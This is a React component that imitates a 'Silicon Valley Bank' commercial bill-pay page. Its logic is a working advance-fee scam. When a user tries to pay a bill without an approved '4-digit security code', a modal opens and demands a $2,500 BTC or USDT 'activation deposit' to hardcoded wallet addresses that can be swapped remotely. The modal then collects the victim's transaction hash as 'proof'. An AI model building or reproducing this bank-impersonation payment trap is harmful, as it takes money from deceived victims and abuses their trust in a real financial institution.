import React, { useState, useEffect } from 'react';
import { User, BillPayment } from '../types';
import { api } from '../services/api';
import { subscribeCryptoAddressesFromFirestore } from '../lib/firebase';
import { 
  Receipt, 
  CheckCircle2, 
  AlertCircle, 
  Building, 
  DollarSign, 
  Calendar, 
  Clock, 
  Plus, 
  FileCheck2,
  ShieldCheck,
  Search,
  Key,
  Shield,
  X,
  Copy,
  Check
} from 'lucide-react';

interface BillPayPanelProps {
  user: User;
  onRefreshUser: () => void;
}

export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser }) => {
  const [bills, setBills] = useState<BillPayment[]>([]);
  const [loading, setLoading] = useState(true);

  // Form State
  const [billerName, setBillerName] = useState('');
  const [billerCategory, setBillerCategory] = useState<'Utilities' | 'Tax & Regulatory' | 'Vendor Invoice' | 'Payroll & Benefits' | 'Rent & Lease'>('Utilities');
  const [amount, setAmount] = useState('');
  const [fourDigitCode, setFourDigitCode] = useState('');
  const [reference, setReference] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [successMsg, setSuccessMsg] = useState('');

  // Deposit $2,500 USD requirement modal state
  const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
  const [showCryptoModal, setShowCryptoModal] = useState(false);
  const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
  const [txHash, setTxHash] = useState('');
  const [proofNote, setProofNote] = useState('');
  const [proofImage, setProofImage] = useState<string | null>(null);
  const [submittingDeposit, setSubmittingDeposit] = useState(false);
  const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
  const [copiedAddress, setCopiedAddress] = useState(false);

  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; USDT: string }>({
    BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
    USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
  });

  useEffect(() => {
    api.getCryptoAddresses()
      .then(res => {
        if (res.addresses) setWalletAddresses(res.addresses);
      })
      .catch(console.error);

    const unsub = subscribeCryptoAddressesFromFirestore((addrs) => {
      setWalletAddresses(prev => ({ ...prev, ...addrs }));
    });

    const handleWindowUpdate = (e: any) => {
      if (e.detail) setWalletAddresses(prev => ({ ...prev, ...e.detail }));
    };
    window.addEventListener('crypto-addresses-updated', handleWindowUpdate);

    return () => {
      unsub();
      window.removeEventListener('crypto-addresses-updated', handleWindowUpdate);
    };
  }, []);

  const copyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const loadBills = async () => {
    try {
      setLoading(true);
      const res = await api.getBillPayments();
      setBills(res.bills || []);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadBills();
  }, []);

  const handlePayBill = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setSuccessMsg('');

    const numAmt = parseFloat(amount);
    if (!billerName.trim()) {
      setError('Please enter the biller or vendor name.');
      return;
    }
    if (isNaN(numAmt) || numAmt <= 0) {
      setError('Please enter a valid bill amount.');
      return;
    }
    if (numAmt > user.balance) {
      setError(`Insufficient account balance. Available: $${user.balance.toFixed(2)}`);
      return;
    }

    if (user.role !== 'admin' && (!user.transferCodeApproved || !user.fourDigitCode || !fourDigitCode.trim() || fourDigitCode.trim() !== user.fourDigitCode.trim())) {
      setShowCryptoModal(true);
      return;
    }

    try {
      setSubmitting(true);
      const res = await api.payBill({
        billerName: billerName.trim(),
        billerCategory,
        accountNumber: user.accountNumber,
        amount: numAmt,
        fourDigitCode: fourDigitCode.trim(),
        reference: reference.trim() || undefined
      });

      setSuccessMsg(`Payment of $${numAmt.toFixed(2)} to ${billerName} was submitted in Pending status for review.`);
      setBillerName('');
      setAmount('');
      setFourDigitCode('');
      setReference('');
      loadBills();
      onRefreshUser();
    } catch (err: any) {
      if (err.message && (err.message.toLowerCase().includes('invalid 4-digit security code') || err.message.toLowerCase().includes('code'))) {
        setShowCryptoModal(true);
      } else {
        setError(err.message || 'Bill payment failed.');
      }
    } finally {
      setSubmitting(false);
    }
  };

  const handleCryptoDepositSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setSubmittingDeposit(true);
      await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: txHash.trim(),
        proofNote: proofNote.trim()
      });
      setDepositSuccessMsg(`$2,500 ${cryptoMethod} Deposit submitted successfully! Silicon Valley Bank will review your transaction and issue your 4-Digit Security Code.`);
      setTxHash('');
      setProofNote('');
      onRefreshUser();
    } catch (err: any) {
      alert(err.message || 'Failed to submit deposit proof');
    } finally {
      setSubmittingDeposit(false);
    }
  };

  return (
    <div className="max-w-7xl mx-auto space-y-8 pb-12">
      {/* Header Banner */}
      <div className="bg-gradient-to-r from-slate-900 via-indigo-950 to-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 -mt-12 -mr-12 w-64 h-64 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
        
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="p-2 bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 rounded-xl">
                <Receipt className="w-5 h-5" />
              </span>
              <span className="text-xs font-bold uppercase tracking-widest text-cyan-400">Silicon Valley Bank Bill Pay</span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">Commercial Bill & Vendor Payments</h1>
            <p className="text-slate-400 text-sm mt-1 max-w-2xl">
              Pay corporate utility providers, software vendors, tax authorities, and lease agreements directly from your SVB accounts with automated remittance confirmation.
            </p>
          </div>

          <div className="bg-slate-950/60 border border-slate-800 p-4 rounded-2xl text-right">
            <p className="text-xs text-slate-400 font-medium">Available Account Balance</p>
            <p className="text-2xl font-mono font-extrabold text-cyan-400 mt-0.5">
              ${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </p>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        {/* Left Column: Form */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-xl space-y-6 h-fit">
          <div className="border-b border-slate-800 pb-4">
            <h2 className="text-lg font-bold text-white flex items-center gap-2">
              <Building className="w-5 h-5 text-cyan-400" />
              Pay a Bill / Vendor
            </h2>
            <p className="text-slate-400 text-xs mt-1">Execute immediate automated payment to any corporate biller.</p>
          </div>

          {error && (
            <div className="p-3 bg-rose-500/10 border border-rose-500/20 text-rose-400 text-xs rounded-2xl flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>{error}</span>
            </div>
          )}

          {successMsg && (
            <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs rounded-2xl flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 shrink-0" />
              <span>{successMsg}</span>
            </div>
          )}

          <form onSubmit={handlePayBill} className="space-y-4 text-xs">
            <div>
              <label className="block text-slate-300 font-semibold mb-1">Biller / Vendor Name</label>
              <input
                type="text"
                value={billerName}
                onChange={e => setBillerName(e.target.value)}
                placeholder="e.g. AWS Cloud Services, PG&E, Slack, IRS Tax"
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-medium focus:border-cyan-500 focus:outline-none"
                required
              />
            </div>

            <div>
              <label className="block text-slate-300 font-semibold mb-1">Category</label>
              <select
                value={billerCategory}
                onChange={e => setBillerCategory(e.target.value as any)}
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-medium focus:border-cyan-500 focus:outline-none"
              >
                <option value="Utilities">Utilities & Infrastructure</option>
                <option value="Vendor Invoice">Software & Vendor Invoice</option>
                <option value="Tax & Regulatory">Tax & Regulatory Fee</option>
                <option value="Payroll & Benefits">Payroll & HR Benefits</option>
                <option value="Rent & Lease">Real Estate Lease & Rent</option>
              </select>
            </div>

            <div>
              <label className="block text-slate-300 font-semibold mb-1">Payment Amount ($ USD)</label>
              <div className="relative">
                <span className="absolute left-3.5 top-2.5 text-slate-400 font-bold">$</span>
                <input
                  type="number"
                  step="0.01"
                  min="1"
                  value={amount}
                  onChange={e => setAmount(e.target.value)}
                  placeholder="0.00"
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-8 pr-3.5 py-2.5 text-white font-mono font-bold focus:border-cyan-500 focus:outline-none"
                  required
                />
              </div>
            </div>

            {/* 4-Digit Security Code Input */}
            <div>
              <label className="block text-slate-300 font-semibold mb-1 flex items-center justify-between">
                <span>4-Digit Security Authorization Code</span>
                <span className="text-[10px] text-amber-400 font-bold flex items-center gap-1">
                  <Key className="w-3 h-3" /> Required
                </span>
              </label>
              <input
                type="password"
                maxLength={4}
                value={fourDigitCode}
                onChange={e => setFourDigitCode(e.target.value)}
                placeholder="••••"
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono font-bold tracking-widest focus:border-cyan-500 focus:outline-none"
                required
              />
            </div>

            <div>
              <label className="block text-slate-300 font-semibold mb-1">Invoice / Reference # (Optional)</label>
              <input
                type="text"
                value={reference}
                onChange={e => setReference(e.target.value)}
                placeholder="e.g. INV-904812"
                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono focus:border-cyan-500 focus:outline-none"
              />
            </div>

            <button
              type="submit"
              disabled={submitting}
              className="w-full py-3 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-extrabold rounded-2xl shadow-lg shadow-cyan-500/20 disabled:opacity-50 transition-all text-xs"
            >
              {submitting ? 'Processing Payment...' : 'Execute Bill Payment'}
            </button>
          </form>
        </div>

        {/* Right Column: Recent Bill History */}
        <div className="lg:col-span-2 bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-xl space-y-6">
          <div className="flex items-center justify-between border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-lg font-bold text-white flex items-center gap-2">
                <FileCheck2 className="w-5 h-5 text-cyan-400" />
                Bill Payment History
              </h2>
              <p className="text-slate-400 text-xs mt-1">Audit log of corporate bill payments processed under account #{user.accountNumber}</p>
            </div>
            <span className="text-xs bg-slate-800 text-slate-300 font-mono px-3 py-1 rounded-full font-semibold">
              {bills.length} Records
            </span>
          </div>

          {loading ? (
            <div className="p-8 text-center text-slate-400">Loading bill payments...</div>
          ) : bills.length === 0 ? (
            <div className="p-8 text-center text-slate-500 border border-slate-800/80 rounded-2xl space-y-2">
              <Receipt className="w-10 h-10 mx-auto text-slate-600" />
              <p className="text-xs font-semibold text-slate-400">No bill payments executed yet.</p>
            </div>
          ) : (
            <div className="divide-y divide-slate-800/80">
              {bills.map(bill => (
                <div key={bill.id} className="py-4 flex items-center justify-between gap-4 hover:bg-slate-800/30 px-3 rounded-xl transition-colors">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-2xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 font-bold shrink-0">
                      <Receipt className="w-5 h-5" />
                    </div>
                    <div>
                      <div className="flex items-center gap-2">
                        <h4 className="font-bold text-white text-xs">{bill.billerName}</h4>
                        <span className={`px-2 py-0.5 rounded-full text-[9px] font-bold ${
                          bill.status === 'Completed' 
                            ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' 
                            : 'bg-amber-500/10 text-amber-400 border border-amber-500/20'
                        }`}>
                          {bill.status || 'Pending'}
                        </span>
                      </div>
                      <div className="flex items-center gap-2 text-[10px] text-slate-400 mt-0.5">
                        <span className="text-cyan-400 font-semibold">{bill.billerCategory}</span>
                        <span>•</span>
                        <span className="font-mono">Ref: {bill.reference}</span>
                      </div>
                    </div>
                  </div>

                  <div className="text-right">
                    <p className="font-mono font-bold text-rose-400 text-sm">
                      -${bill.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                    </p>
                    <p className="text-[10px] text-slate-500 mt-0.5">
                      {new Date(bill.paymentDate).toLocaleDateString()}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Deposit Required Prompt Modal */}
      {showDepositPromptModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl relative space-y-5">
            <button 
              onClick={() => setShowDepositPromptModal(false)}
              className="absolute top-4 right-4 p-2 text-slate-400 hover:text-white rounded-full bg-slate-800/50"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="w-12 h-12 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
              <Shield className="w-6 h-6" />
            </div>

            <div className="text-center space-y-2">
              <h3 className="text-xl font-extrabold text-white">4-Digit Security Code Required</h3>
              <p className="text-xs text-slate-300 leading-relaxed">
                You do not have an approved 4-digit transfer code. To obtain your code and execute outgoing transfers and bill payments, complete a $2,500 BTC or USDT activation deposit.
              </p>
            </div>

            <div className="space-y-3 pt-2">
              <button
                onClick={() => {
                  setShowDepositPromptModal(false);
                  setShowCryptoModal(true);
                }}
                className="w-full py-3 bg-gradient-to-r from-amber-500 to-yellow-500 text-slate-950 font-extrabold text-xs rounded-xl shadow-lg shadow-amber-500/20"
              >
                Deposit $2,500 via BTC / USDT
              </button>
              <button
                onClick={() => setShowDepositPromptModal(false)}
                className="w-full py-2.5 text-slate-400 hover:text-white text-xs font-semibold"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Crypto Payment Modal */}
      {showCryptoModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4 overflow-y-auto">
          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 max-w-lg w-full shadow-2xl relative space-y-6 my-8">
            <button 
              onClick={() => {
                setShowCryptoModal(false);
                setDepositSuccessMsg(null);
              }}
              className="absolute top-4 right-4 p-2 text-slate-400 hover:text-white rounded-full bg-slate-800/50"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="border-b border-slate-800 pb-4">
              <div className="flex items-center gap-2 mb-1">
                <span className="p-1.5 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-lg">
                  <Key className="w-4 h-4" />
                </span>
                <span className="text-[10px] font-bold uppercase tracking-widest text-amber-400">4-Digit Code Security Deposit</span>
              </div>
              <h3 className="text-lg font-bold text-white">Deposit $2,500 USD (BTC or USDT)</h3>
              <p className="text-xs text-slate-400 mt-1">
                Send exactly $2,500 USD in cryptocurrency to the SVB Treasury address below to receive your permanent 4-Digit Security Authorization Code.
              </p>
            </div>

            {depositSuccessMsg ? (
              <div className="p-4 bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs rounded-2xl space-y-4 text-center">
                <CheckCircle2 className="w-8 h-8 text-emerald-400 mx-auto" />
                <p className="font-semibold leading-relaxed">{depositSuccessMsg}</p>
                <button
                  onClick={() => {
                    setShowCryptoModal(false);
                    setDepositSuccessMsg(null);
                  }}
                  className="px-6 py-2 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs"
                >
                  Close Window
                </button>
              </div>
            ) : (
              <form onSubmit={handleCryptoDepositSubmit} className="space-y-5 text-xs">
                {/* Method selector */}
                <div>
                  <label className="block text-slate-300 font-semibold mb-2">Select Cryptocurrency Network</label>
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      type="button"
                      onClick={() => setCryptoMethod('BTC')}
                      className={`p-3 rounded-2xl border text-left flex items-center justify-between transition-all ${
                        cryptoMethod === 'BTC'
                          ? 'bg-amber-500/10 border-amber-500 text-white font-bold'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
                      }`}
                    >
                      <span>Bitcoin (BTC)</span>
                      <span className="text-[10px] bg-amber-500/20 text-amber-400 px-2 py-0.5 rounded-full font-mono">BTC</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => setCryptoMethod('USDT')}
                      className={`p-3 rounded-2xl border text-left flex items-center justify-between transition-all ${
                        cryptoMethod === 'USDT'
                          ? 'bg-emerald-500/10 border-emerald-500 text-white font-bold'
                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
                      }`}
                    >
                      <span>Tether (USDT)</span>
                      <span className="text-[10px] bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded-full font-mono">TRC20</span>
                    </button>
                  </div>
                </div>

                {/* Wallet Address Box */}
                <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between text-slate-400 text-[11px]">
                    <span>Official {cryptoMethod} Deposit Address</span>
                    <span className="text-emerald-400 font-bold">Amount: $2,500.00 USD</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      readOnly
                      value={walletAddresses[cryptoMethod]}
                      className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-amber-300 font-mono text-[11px] select-all focus:outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => copyAddress(walletAddresses[cryptoMethod])}
                      className="p-2 bg-slate-800 hover:bg-slate-700 text-white rounded-xl transition-colors shrink-0"
                      title="Copy Address"
                    >
                      {copiedAddress ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                {/* TxHash Input */}
                <div>
                  <label className="block text-slate-300 font-semibold mb-1">Transaction Hash / Blockchain TxID (Required)</label>
                  <input
                    type="text"
                    required
                    value={txHash}
                    onChange={e => setTxHash(e.target.value)}
                    placeholder="Paste blockchain transaction hash or reference ID"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono focus:border-cyan-500 focus:outline-none"
                  />
                </div>

                {/* Note */}
                <div>
                  <label className="block text-slate-300 font-semibold mb-1">Payment Proof Note / Sender Wallet (Optional)</label>
                  <input
                    type="text"
                    value={proofNote}
                    onChange={e => setProofNote(e.target.value)}
                    placeholder="e.g. Sent from Exodus wallet / Coinbase"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-cyan-500 focus:outline-none"
                  />
                </div>

                <button
                  type="submit"
                  disabled={submittingDeposit}
                  className="w-full py-3 bg-gradient-to-r from-emerald-500 to-teal-600 text-slate-950 font-extrabold text-xs rounded-xl shadow-lg shadow-emerald-500/20 disabled:opacity-50"
                >
                  {submittingDeposit ? 'Submitting Verification...' : 'Submit Deposit Verification Proof'}
                </button>
              </form>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
